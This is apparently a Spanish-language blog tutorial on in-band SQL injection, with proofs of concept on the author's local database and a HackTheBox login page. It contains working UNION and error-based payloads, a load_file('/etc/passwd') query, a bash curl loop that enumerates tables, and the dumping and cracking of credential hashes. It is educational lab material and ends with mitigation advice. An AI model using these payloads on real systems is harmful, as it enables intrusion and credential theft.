---
title: SQLInjection In-Band
author:
date: 15-11-2023
categories: [Hacking Web, SQLInjection]
tags: [SQLI, ErrorBased]
pin: false
image:
  path: /assets/img/commons/SQLI/sqli.png
  alt: SQLI 
---

## ¿Qué es la inyección SQL?  
En algún momento en el campo de la ciberseguridad hemos escuchado este término de ataques de inyecciones, pero que es realmente y como se produce en algún sistema de gestor de base de datos?? Una inyección SQL (del inglés SQL injection) se define como la explotación de una vulnerabilidad en los sistemas de bases relacionales accediendo a sus datos por medio del **lenguaje SQL**. Los ciberdelincuentes aprovechan estos fallos de seguridad en la superficie de la base de datos que no han sido correctamente sanitizados  inyectando valores y alterando la integridad con metacaracteres como el guion doble, las comillas o el punto y coma

El uso específico de metacaracteres permite a usuarios no autorizados acceder a otros comandos SQL y manipular las entradas para modificar, borrar o leer datos. Un ciber delincuente  puede tener acceso al CLI  del sistema y tener una ejecución remota de comandos RCE, por lo tanto podría tener acceso a toda la base del servidor 

Las inyecciones SQL, incluyendo las basadas en errores y las de tipo UNION, son métodos de ataque que explotan vulnerabilidades en las aplicaciones web para manipular las consultas a la base de datos. Este tipo de ataque ocurren cuando una aplicación no valida  las entradas de usuario. 

## Fundamentos

En primer lugar, es fundamental comprender que SQL (Structured Query Language) es un lenguaje utilizado para administrar bases de datos. SQL nos permite definir, extraer y manipular datos almacenados en una base de datos de manera eficaz.

<mark style="background: #FFB86CA6;">Las sentencias SQL se pueden agrupar en cinco categorías principales:</mark>

| Tipo de Sentencia SQL           | Descripción                                                                                                    |
|----------------------------------|----------------------------------------------------------------------------------------------------------------|
| DQL (Data Query Language)        | Esta categoría incluye la instrucción **SELECT**, que se utiliza para consultar y recuperar datos.            |
| DML (Data Manipulation Language) | Aquí encontramos instrucciones como **INSERT, UPDATE o DELETE**, que se emplean para modificar datos.        |
| DDL (Data Definition Language)   | Las instrucciones de **CREATE, ALTER, DROP o TRUNCATE** pertenecen a esta categoría y se usan para definir la estructura de la base de datos. |
| DCL (Data Control Language)      | En esta categoría se encuentran instrucciones como **GRANT o REVOKE**, que se utilizan para administrar los permisos y la seguridad de los datos. |
| TCL (Transaction Control Language) | Por último, las instrucciones de **BEGIN, TRAN, COMMIT o ROLLBACK** se utilizan para controlar las transacciones en la base de datos. |

<mark style="background: #FFB86CA6;">La mayoría de las inyecciones SQL se relacionan con las categorías DQL, DML y DCL.</mark>

En el mundo de las bases de datos, podemos distinguir dos tipos principales: las bases de datos relacionales (SQL) y las bases de datos no relacionales (NoSQL). Las bases de datos relacionales, conocidas como SQL, utilizan tablas para organizar y estructurar la información. Por otro lado, las bases de datos no relacionales o NoSQL adoptan diversos modelos de datos, como documentos (usando una estructura tipo clave-valor), grafos, sistemas clave-valor o columnas.

<mark style="background: #16BFF3A6;">En resumen, SQL almacena datos en tablas, mientras que NoSQL utiliza modelos de datos más flexibles y adaptables, como documentos, grafos y sistemas clave-valor.</mark>

Dentro del ámbito de las bases de datos, encontramos dos modelos principales: SQL y NoSQL. Estos modelos se materializan a través de herramientas conocidas como Sistemas de Gestión de Bases de Datos (DBMS). Para las bases de datos relacionales, específicamente, existen herramientas denominadas Sistemas de Gestión de Bases de Datos Relacionales (RDBMS).

**DBMS (Sistema de Gestión de Bases de Datos)**: Un DBMS es un conjunto de software que permite a los usuarios interactuar con las bases de datos de manera eficiente. Estos sistemas ofrecen una interfaz para crear, almacenar, modificar y recuperar datos.

|Concepto|Ejemplos Famosos|
|---|---|
|DBMS|Algunos ejemplos conocidos incluyen MongoDB, Cassandra, Redis, Couchbase, Neo4j y Amazon DynamoDB.|

**RDBMS (Sistema de Gestión de Bases de Datos Relacionales)**: Un RDBMS es un tipo específico de DBMS que se basa en el modelo relacional. Utiliza tablas para almacenar y organizar datos, estableciendo relaciones mediante claves primarias y foráneas. Estos sistemas son altamente estructurados y garantizan la integridad de los datos.

| Concepto | Ejemplos Famosos                                                 |
| -------- | ---------------------------------------------------------------- |
| RDBMS    | Entre los ejemplos más reconocidos se encuentran MySQL, PostgreSQL, Oracle Database, Microsoft SQL Server y SQLite. |

## Tipos de Inyecciones SQL

**Existen tres tipos principales de inyecciones SQL: SQLI in-band, Blind SQL Injection y SQLI Out-of-Band.**
### In-band SQLi

**Error-based SQLI**: En este tipo de inyección, se realizan acciones que generan mensajes de error en la base de datos. Un ciberdelincuente puede aprovechar estos mensajes de error para obtener información sobre la estructura de la base de datos.

**Union-based SQLI**: Esta técnica se basa en el operador UNION SQL, que combina múltiples declaraciones de selección generadas por la base de datos para obtener una única respuesta HTTP. Esta respuesta puede contener datos que el atacante puede explotar.

### Inferential (Blind) SQLI

<mark style="background: #D2B3FFA6;">En el caso de la inyección SQL ciega, el atacante envía datos al servidor y observa la respuesta y el comportamiento del servidor para obtener más información sobre su estructura.</mark> Este método recibe el nombre de SQLI ciego porque los datos no se transfieren de la base de datos del sitio web al atacante, por lo que este último no puede visualizar la información relacionada con el ataque de manera directa.

Las inyecciones ciegas de SQL se basan en la respuesta y los patrones de comportamiento del servidor, lo que las hace más lentas pero igualmente peligrosas. Estas inyecciones ciegas se pueden clasificar en dos categorías:

**Boolean**: En este enfoque, el atacante envía una consulta SQL que solicita a la aplicación que devuelva un resultado. El resultado varía según si la consulta es verdadera o falsa, lo que afecta la información en la respuesta HTTP. El atacante puede determinar si la consulta generó un resultado verdadero o falso.

**Time-based**: En este caso, el atacante envía una consulta SQL que hace que la base de datos espere antes de responder. El atacante observa el tiempo que tarda la base de datos en responder para determinar si la consulta es verdadera o falsa. La respuesta HTTP se genera instantáneamente o después de un período de espera, según el resultado. De esta manera, el atacante puede identificar si la consulta devolvió un resultado verdadero o falso sin acceder a los datos de la base de datos.
### Inyección SQL basada en Errores
En el caso de una inyección SQL basada en errores, un atacante introduce datos maliciosos en la entrada de un formulario. Por ejemplo, en una aplicación que permite buscar productos, la consulta SQL generada normalmente sería:

```sql
SELECT * FROM productos WHERE nombre = 'nombre_del_producto';
```

Un atacante puede introducir algo como `' OR 1=1 --`, alterando la consulta a:

```sql
SELECT * FROM productos WHERE nombre = '' OR 1=1 --';
```

Aquí, `' OR 1=1 --` cambia la lógica de la consulta, retornando todos los registros de la base de datos. La falla de sanitización se evidencia en la forma en que la aplicación maneja la entrada del usuario, permitiendo la inyección de SQL y la manipulación de la consulta.

### Inyecciones SQL de Tipo UNION
Las inyecciones SQL de tipo UNION son otra técnica de ataque. En este caso, el atacante utiliza el comando `UNION` de SQL para combinar el resultado de dos o más consultas SELECT en una sola respuesta, lo que puede revelar información adicional de la base de datos.

#### Ejemplo de Inyección SQL UNION
Consideremos una aplicación con una vulnerabilidad similar en su funcionalidad de búsqueda. La consulta original podría ser:

```sql
SELECT nombre, precio FROM productos WHERE categoria = 'categoria_usuario';
```

Un atacante puede ingresar algo como `' UNION SELECT username, password FROM usuarios --`. Esto modificaría la consulta a:

```sql
SELECT nombre, precio FROM productos WHERE categoria = '' UNION SELECT username, password FROM usuarios --';
```

Esta consulta modificada combina dos consultas: una que selecciona nombres y precios de productos, y otra que selecciona nombres de usuario y contraseñas de una tabla de usuarios. Esto podría resultar en que la aplicación revele información sensible de la base de datos, como nombres de usuario y contraseñas.

## SQL injection POC
Para entender todo esto mas a detalle voy a crear una base de datos llamada Universidad 

![](/assets/img/commons/SQLI/sql1.png)

Primeramente voy a crear una tabla llamada Alumnos, donde en las columnas voy a poner su ID, Nombre, contraseña y correo 

![](/assets/img/commons/SQLI/sql2.png)

Creo 3 nombres con su respectivo, id, nombre, contraseña y correo 

![](/assets/img/commons/SQLI/sql3.png)

Bien en este punto ya podemos hacer consultas  a nuestra pequeña base de datos creada podemos hacer un select para el nombre la contraseña o el id

![](/assets/img/commons/SQLI/sql4.png)

En esta imagen hago unas consultas, la primera quiere decir que estoy seleccionando el puro ID y la contraseña de la tabla Alumnos donde el nombre sea Omar  

```sql
select id,password from Alumnos where nombre = 'omar';
```
Podemos generar un error de Syntaxis a través de esta primera sentencia y nos podemos basar con el error para generar nuestra inyecciones, por eso se le conoce **Error Based**, el objetivo es primero generar el error para después generar un ordenamiento

```sql
MariaDB [Universidad]> select id,password from Alumnos where nombre = omar'';
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''' at line 1
```
Una vez generado el error procederemos a enumerar las columnas con **order by** primero empezaré desde la 5 hasta llegar a enumerar las que hace la sentencia por detrás

> Generalmente en las bases de datos a la hora de consultar un registro siempre se consultará un ID primero ya que es una forma de llevar un orden en los registros

![](/assets/img/commons/SQLI/sql6.png) 

Observamos que nuestro tope de las columnas del llamado a nombre y contraseña son 2 columnas por lo tanto podemos aplicar un **union select** a nuestras columnas existentes de la sentencia 

```sql
select nombre,password from Alumnos where id = 1 union select 1,2;
```
(Podemos agregar valores NULL en los campos o directamente escribir texto para ver la interpretación de nuestros valores en las columnas)

```sql
select nombre,password from Alumnos where id = 1 union select NULL,NULL;
```
![](/assets/img/commons/SQLI/sql7.png)

En este punto ya podemos inyectar nuestras sentencias para filtrar información del sistema o de la base de datos.

Ejemplo1: voy a ver el nombre de la base de datos

```sql
select nombre,password from Alumnos where id = 1 union select "NULL", database();
```
![](/assets/img/commons/SQLI/sql8.png)

efectivamente se llama Universidad mi base de datos

Ejemplo 2: quiero ver el usuario que esta corriendo la base de datos

```sql
select nombre,password from Alumnos where id = 1 union select "NULL", user();
```
![](/assets/img/commons/SQLI/sql9.png)

Efectivamente mi base de datos esta corriendo como root en mi localhost:)

Ejemplo 3: cargaré un archivo directamente de mi sistema por ejemplo el /etc/passwd

```sql
select nombre,password from Alumnos where id = 1 union select "NULL", load_file('/etc/passwd');
```
![](/assets/img/commons/SQLI/sql10.png)

### Enumerando Base de datos

directamente vamos a inyectar sentencias para filtrar información propia de nuestra DB.

Comenzaré a observar los nombres de nuestras bases de datos creadas

```sql
select nombre,password from Alumnos where id = 1 union select "NULL", schema_name from information_schema.schemata;
```
![](/assets/img/commons/SQLI/sql11.png)

Ahora bien digamos que este atacante ya consulto el nombre de mis bases de datos y quiere saber mas sobre Universidad por lo tanto la siguiente consulta es para las tablas de la base de datos 'Universidad'

> Nota: podemos filtrarlo con un valor hexadecimal 

```sql
select nombre,password from Alumnos where id = 1 union select "NULL", table_name from information_schema.tables where table_schema = 'Universidad';

#Hexadecimal 

select nombre,password from Alumnos where id = 1 union select "NULL", table_name from information_schema.tables where table_schema = 0x556e6976657273696461640a;
```
![](/assets/img/commons/SQLI/sql12.png)

Ahora vamos a observar las columnas de mi base de datos Universidad de la tabla Alumnos

```sql
select nombre,password from Alumnos where id = 1 union select "NULL", column_name from information_schema.columns where table_schema = 'Universidad' and table_name = 'Alumnos';
```
![](/assets/img/commons/SQLI/sql13.png)

Como ya sabemos las columnas , el nombre de la base de datos y las tablas es momento de filtrar por lo que nos interesa mmmmmhhh las contraseñas asi es :D **podemos agregar un group concat para filtrar el nombre y la contraseña separada de dos puntos**

```sql
select nombre,password from Alumnos where id = 1 union select "NULL", group_concat(nombre,':',password) from Alumnos;
```
![](/assets/img/commons/SQLI/sql14.png)

Y asi es como obtenemos las credenciales de una base de datos con SQLInjection ;)

```text
Omar:P@ssword123!,
Kevin:K3v1n_1235,
Ulises:Ul1z3s_qwr58 
```
## Poc2 SQLInjection

Ahora haré una demostración en un entorno controlado con una máquina de HackTheBox donde se pueden aplicar estas inyecciones es un aplicativo web 

Supongamos que tenemos este inicio de sesión en donde por detrás se hacen consultas para autenticarte, cada registro se va a una base de datos (como la que hice anteriormente)

![](/assets/img/commons/SQLI/sql15.png)

Primeramente voy a interceptar la petición al iniciar sesión para observar el response mas fácil, y mi primer objetivo será generar un error, directamente alterar la consulta o podemos llegar a unir nuestras consultas que inyectaremos

> voy a aletrar la consulta dando como verdadero **IMPORTANTE FIJARSE EN LA CANTIDAD DE BYTES QUE NOS DA LA RESPUESTA**

Primero envío la data sin aletrar ninguna consulta y vemos la respuesta genera error de inicio de sesión

![](/assets/img/commons/SQLI/sql16.png)

Ahora inyectaré ' or 1=1-- - para ocasionar este true y me generé una consulta por detrás no deseada en el servidor  

![](/assets/img/commons/SQLI/sql17.png)

Me voy a basar en ese content Length y del response Welcome, cuando vuelva a atinar el ordenamiento de las columnas me debe de salir un tamaño de bytes similar y el Welcome 

![](/assets/img/commons/SQLI/sql18.png)

Muy bien!! con 4 me respondé de igual forma por lo tanto haré un union del 1 al 4

![](/assets/img/commons/SQLI/sql19.png)

vemos que el 4 esta siendo interpretado en el sistema **droix4** por lo tanto ahi haré las siguientes inyecciones 

### Enumerando bases de datos 

![](/assets/img/commons/SQLI/sql20.png)

Sabemos que information_schema viene por defecto cuando creas una base de datos pero seguido esta una llamada main por lo tanto la base de datos a la cual le inyectaré las querys será main

> Importante ; jugar con limit para una buena enumeración y limitar nuestro contenido aqui me crearé un script rápido 

### Enumerando Tablas 

No tengo mucha información , sin embargo con el limit me da mas tablas asi que me creo un script en bash rápido para enumerarlas  rápido y pueda llegar a una tabla interesante 

```bash
for i in $(seq 0 100); do echo "Numero $i: $(curl -s -X POST http://10.10.11.130/login --data "email=droix%40htb.local' union select 1,2,3,table_name from information_schema.tables limit $i,1-- -&password=test12345" | grep "Welcome" | sed 's/^ *//' | awk 'NF{print $NF}' | awk '{print $1}' FS="<")"; done
``` 
![](/assets/img/commons/SQLI/sql21.png)

hasta el número 82 vemos una tabla user

![](/assets/img/commons/SQLI/sql22.png)

### Enumerando Columnas

inyectaré las siguientes querys en user para observar sus columnas de esa tabla

![](/assets/img/commons/SQLI/sql23.png)

vemos que esta junto droixemailnamepassword por lo tanto esta email, name y password en las columnas

ahora haré un ultimo dump sobre esta tabla con un group_concat y limit para quitar lo del principio y solo quedarme con los ultimos dos valores que están 

![](/assets/img/commons/SQLI/sql24.png)

vemos mi usuario droix con su hash que había creado anteriormente y el usuario admin:)

ahora copiaré su hash md5 y lo crackearé por fuerza bruta de forma offline con john para saber su contraseña 

![](/assets/img/commons/SQLI/sql25.png)

y listo:) tenemos ya dumpeada totalmente la base de datos filtrando en donde mas nos importaba, en otro apartado escribiré formas de generar un RCE en el sistema desde una SQLinjection y en otro apartado escribiré como hacer inyecciones de tipo booleanas y a ciegas

### Prevención y Mitigación
Para prevenir ambas formas de inyecciones SQL, es crucial:
- Implementar validación y sanitización rigurosa de las entradas de usuario.
- Utilizar consultas parametrizadas para separar el código SQL de los datos.
- Evitar mostrar mensajes de error que revelen detalles de la estructura de la base de datos.

Ambos tipos de inyecciones SQL representan una seria amenaza para la seguridad de las aplicaciones web, y requieren una atención meticulosa en el diseño y mantenimiento de sistemas seguros para proteger la información sensible.


